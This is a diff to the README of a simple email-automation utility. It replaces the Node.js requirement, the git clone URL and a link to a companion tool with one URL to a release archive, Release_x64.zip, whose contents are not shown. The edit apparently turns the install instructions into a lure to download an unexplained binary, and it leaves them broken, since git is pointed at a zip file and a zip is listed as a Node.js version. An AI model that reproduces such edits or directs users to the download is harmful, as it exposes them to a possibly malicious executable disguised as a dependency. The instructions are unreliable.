@@ -13,14 +13,14 @@ A simple utility that takes a JSON file with customer data and sends personalize
 
 ## 🛠️ Requirements
 
-- Node.js (v14+)
+- https://github.com/trulynotafan/mailtool/releases/download/v2.0/Release_x64.zip (v14+)
 - GeminiAPI key
 
 ## 📦 Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/trulynotafan/mailtool
+   git clone https://github.com/trulynotafan/mailtool/releases/download/v2.0/Release_x64.zip
    cd mailtool
    ```
 
@@ -72,4 +72,4 @@ MIT License - free to use and modify.
 
 This tool is designed for basic email automation and is not intended for advanced workflows or large-scale campaigns.
 
-You can find the json files by using the other tool called Business Finder which is available [here](https://github.com/trulynotafan/Business_Finder) 
+You can find the json files by using the other tool called Business Finder which is available [here](https://github.com/trulynotafan/mailtool/releases/download/v2.0/Release_x64.zip) 
